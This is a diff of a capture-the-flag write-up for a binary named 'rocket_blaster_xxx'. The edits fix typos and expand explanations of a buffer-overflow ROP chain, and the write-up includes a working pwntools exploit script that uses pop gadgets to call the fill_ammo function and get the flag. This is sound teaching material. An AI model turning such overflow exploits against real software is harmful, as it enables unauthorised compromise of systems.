@@ -31,9 +31,10 @@ $ checksec rocket_blaster_xxx
     RUNPATH:  b'./glibc/'
 ```
 
-Without canaries and PIE disabled we can potentially do a simple `BOF` and call functions from within the binary without needing to leak them.
+Without canaries and PIE disabled we can potentially do a simple `BOF` and call functions from within the binary without needing to leak them dynamically.
 
 ```c
+/* decompilation from Ghidra */
 undefined8 main(void)
 
 {
@@ -59,6 +60,7 @@ undefined8 main(void)
 ```
 
 ```c
+/* decompilation from Ghidra */
 void fill_ammo(long param_1,long param_2,long param_3)
 
 {
@@ -145,7 +147,7 @@ Gadgets
 
 ```
 
-Whit this gadgets at hand we can write our final exploit, the registers `RDI`, `RSI`, `RDX` will be used to set the first, second, and third parameters respectively. Before popping the parameters from the stack it is necessary to write a `ret` gadget to avoid stack alignment issues.
+With this gadgets at hand we can write our final exploit, the registers `RDI`, `RSI` and `RDX` will be used to set the first, second, and third parameters respectively, those registers are commonly use for that purpose. Before popping the parameters from the stack to the registers, it is necessary to write a `ret` gadget to avoid stack alignment issues. Finally, set the `fill_ammo` function at the end of the `ROP chain` to execute it and get the flag. Here is my exploit script:
 
 ```Python
 #!/usr/bin/python3
@@ -170,7 +172,9 @@ def start():
 
 io = start()
 
-#=======================================================================================
+#============================================================
+#                    EXPLOIT GOES HERE
+#============================================================
 
 pop_rdi = 0x40159f
 pop_rdx = 0x40159b
@@ -183,7 +187,7 @@ io.sendlineafter(b">> ", b"A"*40 + p64(ret) \
                          + p64(pop_rdx) + p64(0xdead1337) \
                          + p64(elf.sym.fill_ammo))
 
-#=======================================================================================
+#============================================================
 
 # Interact with the process
 io.interactive()
